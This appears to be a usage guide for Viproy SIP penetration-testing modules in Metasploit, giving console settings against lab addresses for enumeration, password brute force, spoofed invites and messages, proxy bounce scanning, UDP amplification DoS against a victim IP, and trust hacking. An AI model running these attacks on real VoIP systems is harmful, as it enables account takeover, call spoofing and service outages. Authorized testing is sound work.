#SIP Modules Usage

##Register 

use auxiliary/voip/viproy_sip_register <br>
set RHOSTS 192.168.1.222 <br>
set USERNAME 201<br>
set FROM 201<br>
set PASSWORD password123<br>
set PROTO TCP<br>
set LOGIN true<br>
set DEBUG true<br>
set VERBOSE true <br>
run<br><br>

http://www.viproy.com/captures/sip_register.pcapng<br>

##Options 

use auxiliary/voip/viproy_sip_options <br>
set RHOSTS 192.168.1.221-222<br>
set PROTO UDP<br>
set DEBUG true<br>
set VERBOSE true<br>
run<br><br>

http://www.viproy.com/captures/sip_options.pcapng<br>

##Negotiate 

use auxiliary/voip/viproy_sip_negotiate <br>
set RHOSTS 192.168.1.221-222<br>
set PROTO UDP<br>
set DEBUG true<br>
set VERBOSE true<br>
run<br><br>

http://www.viproy.com/captures/sip_negotiate.pcapng<br>

##Subscribe 

use auxiliary/voip/viproy_sip_subscribe<br>
set RHOST 192.168.1.221<br>
set PROTO UDP<br>
set DEBUG true<br>
set VERBOSE true<br>
run<br><br>

http://www.viproy.com/captures/sip_subscribe.pcapng<br>

##Enumerate 

use auxiliary/voip/viproy_sip_enumerate <br>
set RHOST 192.168.1.221<br>
set NUMERIC_USERS true<br>
set NUMERIC_MIN 100<br>
set NUMERIC_MAX 210<br>
set VERBOSE false<br>
run<br><br>

http://www.viproy.com/captures/sip_enumerate.pcapng<br>


##Brute Force 

use auxiliary/voip/viproy_sip_bruteforce <br>
set RHOST 192.168.1.221<br>
set NUMERIC_USERS true<br>
set NUMERIC_MIN 101<br>
set NUMERIC_MAX 102<br>
set PASSWORD letmein123<br>
set VERBOSE true<br>
set DEBUG true<br>
run<br><br>

http://www.viproy.com/captures/sip_bruteforce.pcapng<br>

##Invite

use auxiliary/voip/viproy_sip_invite <br>
show options <br>
set CPORT 5075<br>
set RHOST 192.168.1.222<br>
set FROM 203<br>
set TO 201<br>
set DEBUG true<br>
set VERBOSE true<br>
set LOGIN true<br>
set PASSWORD test12345<br>
set USERNAME 203<br>
run<br><br>

http://www.viproy.com/captures/sip_invite.pcapng<br>

##Message

use auxiliary/voip/viproy_sip_message<br>
show options <br>
set RHOST 192.168.1.222<br>
set FROM 203<br>
set TO 201<br>
set USERNAME 203<br>
set LOGIN true<br>
set MESSAGE_CONTENT test<br>
set PASSWORD test12345<br>
run<br><br>

http://www.viproy.com/captures/sip_message.pcapng<br>

##Proxy Bounce Scan

use auxiliary/voip/viproy_sip_proxybouncescan <br>
show options <br>
set CPORT 5089<br>
set RHOSTS 192.168.1.220-225<br>
set RPORTS 5060-5070<br>
set SIP_SERVER_IP 192.168.1.222<br>
set SIP_SERVER_PORT 5060<br>
run<br><br>

http://www.viproy.com/captures/sip_proxybouncescan.pcapng<br>

##UDP Amplification DOS

use auxiliary/voip/viproy_sip_udpampdos <br>
set SIP_SERVERS 192.168.1.221<br>
set VICTIM_IP 192.168.1.222<br>
set VICTIM_PORT 5098<br>
set INTERFACE en5<br>
show options <br>
run<br><br>

http://www.viproy.com/captures/sip_udpampdos.pcapng<br>

##UDP Trust Hacking

use auxiliary/voip/viproy_sip_trusthacking <br>
set SRC_RHOSTS 192.168.1.220-225<br>
set SIP_SERVER 192.168.1.222<br>
set THREADS 5<br>
set INTERFACE eth0<br>
run<br><br>

http://www.viproy.com/captures/sip_trusthacking.pcapng<br>

